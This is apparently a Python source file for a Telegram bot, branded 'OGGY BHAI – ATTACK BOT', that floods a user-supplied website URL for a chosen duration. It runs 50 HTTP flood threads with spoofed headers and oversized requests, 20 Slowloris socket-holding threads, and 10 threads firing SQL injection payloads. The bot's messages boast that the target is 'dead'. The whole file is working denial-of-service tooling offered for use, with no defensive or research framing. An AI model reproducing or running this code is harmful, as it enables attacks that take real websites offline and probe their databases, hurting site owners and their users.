import telebot
import requests
import threading
import time
import random
import os
import socket

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')  # Environment variable se le
OWNER_ID = "YOUR_TELEGRAM_ID"
bot = telebot.TeleBot(BOT_TOKEN)

# ========== GLOBAL VARIABLES ==========
attack_threads = {}
attack_active = {}
request_count = {}

# ========== START COMMAND ==========
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, """
🔥 **OGGY BHAI – ATTACK BOT AKTIVE** 🔥

Commands:
/attack - Start new attack
/status - Check running attacks
/stop - Stop all attacks
/owner - Owner info

💀 **HOW TO USE:**
1. Send /attack
2. Enter website URL (with http:// or https://)
3. Enter duration in seconds (e.g., 60, 300, 600)
4. Bot will start attack automatically!
""")

@bot.message_handler(commands=['owner'])
def owner_info(message):
    bot.reply_to(message, "👑 **Owner:** @BGMI_MAIN\n💻 **Developer:** OGGY BHAI")

# ========== ATTACK COMMAND ==========
@bot.message_handler(commands=['attack'])
def attack_command(message):
    chat_id = message.chat.id
    msg = bot.reply_to(message, "🎯 **Enter target URL:**\n(Example: https://target.com)")
    bot.register_next_step_handler(msg, get_url)

def get_url(message):
    chat_id = message.chat.id
    url = message.text.strip()
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    msg = bot.reply_to(message, f"✅ Target: {url}\n⏱️ **Enter duration in seconds:**\n(Example: 60, 300, 600)")
    bot.register_next_step_handler(msg, lambda m: get_duration(m, url))

def get_duration(message, url):
    chat_id = message.chat.id
    try:
        duration = int(message.text.strip())
        if duration < 5:
            bot.reply_to(message, "❌ Minimum 5 seconds!")
            return
        
        bot.reply_to(message, f"""
🔥 **ATTACK CONFIGURATION CONFIRMED** 🔥

🎯 Target: {url}
⏱️ Duration: {duration} seconds
💀 Status: Starting...

⚠️ **Attack will start in 5 seconds!**
""")
        
        time.sleep(5)
        start_attack(message, url, duration)
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid duration! Please enter a number.")

# ========== ATTACK ENGINE ==========
def start_attack(message, url, duration):
    chat_id = message.chat.id
    attack_id = str(chat_id) + "_" + str(int(time.time()))
    
    bot.reply_to(message, f"""
💀 **ATTACK LAUNCHED** 💀

🎯 Target: {url}
⏱️ Duration: {duration} seconds
🔥 Method: HTTP FLOOD + SLOWLORIS + SQL INJECTION
📊 Status: ACTIVE

⚡ **OGGY BHAI IS DESTROYING THE TARGET!**
""")
    
    attack_active[attack_id] = True
    request_count[attack_id] = 0
    
    threads = []
    
    # HTTP Flood (50 threads)
    for _ in range(50):
        t = threading.Thread(target=http_flood, args=(url, attack_id))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Slowloris (20 threads)
    for _ in range(20):
        t = threading.Thread(target=slowloris, args=(url, attack_id))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # SQL Injection (10 threads)
    for _ in range(10):
        t = threading.Thread(target=sql_flood, args=(url, attack_id))
        t.daemon = True
        t.start()
        threads.append(t)
    
    attack_threads[attack_id] = threads
    
    def auto_stop():
        time.sleep(duration)
        stop_attack(attack_id)
        bot.send_message(chat_id, f"""
✅ **ATTACK STOPPED** ✅

🎯 Target: {url}
⏱️ Duration: {duration} seconds
📊 Total requests sent: {request_count.get(attack_id, 0)}

💀 **Target is now dead! OGGY BHAI FTW!**
""")
    
    threading.Thread(target=auto_stop).start()

# ========== ATTACK METHODS ==========
def http_flood(url, attack_id):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)",
        "Mozilla/5.0 (Linux; Android 11)",
        "Googlebot/2.1"
    ]
    
    while attack_active.get(attack_id, False):
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            requests.get(url, headers=headers, timeout=1)
            requests.post(url, data={"a": "A"*10000}, headers=headers, timeout=1)
            requests.get(url + "/" + "a"*random.randint(1000, 5000), headers=headers, timeout=1)
            request_count[attack_id] = request_count.get(attack_id, 0) + 3
        except:
            pass

def slowloris(url, attack_id):
    try:
        host = url.replace('http://', '').replace('https://', '').split('/')[0]
        port = 443 if url.startswith('https') else 80
        
        while attack_active.get(attack_id, False):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(f"Host: {host}\r\n".encode())
                while attack_active.get(attack_id, False):
                    s.send(b"X-Header: " + b"A"*500 + b"\r\n")
                    time.sleep(5)
            except:
                pass
    except:
        pass

def sql_flood(url, attack_id):
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' AND SLEEP(10)--",
        "' OR (SELECT COUNT(*) FROM users)--"
    ]
    
    while attack_active.get(attack_id, False):
        try:
            for payload in payloads:
                requests.get(f"{url}?id={payload}", timeout=1)
                requests.post(url, data={"id": payload}, timeout=1)
        except:
            pass

# ========== STOP ATTACK ==========
def stop_attack(attack_id):
    attack_active[attack_id] = False
    if attack_id in attack_threads:
        del attack_threads[attack_id]

@bot.message_handler(commands=['stop'])
def stop_all_attacks(message):
    chat_id = message.chat.id
    for attack_id in list(attack_active.keys()):
        if attack_id.startswith(str(chat_id)):
            stop_attack(attack_id)
    bot.reply_to(message, "✅ **All attacks stopped!**")

# ========== STATUS COMMAND ==========
@bot.message_handler(commands=['status'])
def status_command(message):
    chat_id = message.chat.id
    active = [aid for aid in attack_active if attack_active[aid] and aid.startswith(str(chat_id))]
    
    if active:
        total_requests = sum(request_count.get(aid, 0) for aid in active)
        bot.reply_to(message, f"""
📊 **ATTACK STATUS**

🟢 Active attacks: {len(active)}
📈 Total requests: {total_requests}
💀 **OGGY BHAI IS ON FIRE!**
""")
    else:
        bot.reply_to(message, "❌ No active attacks.")

# ========== KEEP ALIVE ==========
def keep_alive():
    while True:
        try:
            time.sleep(300)
        except:
            pass

# ========== START BOT ==========
if __name__ == "__main__":
    print("🔥 OGGY BHAI – ATTACK BOT STARTED 🔥")
    print("💀 Ready to destroy targets!")
    threading.Thread(target=keep_alive).start()
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
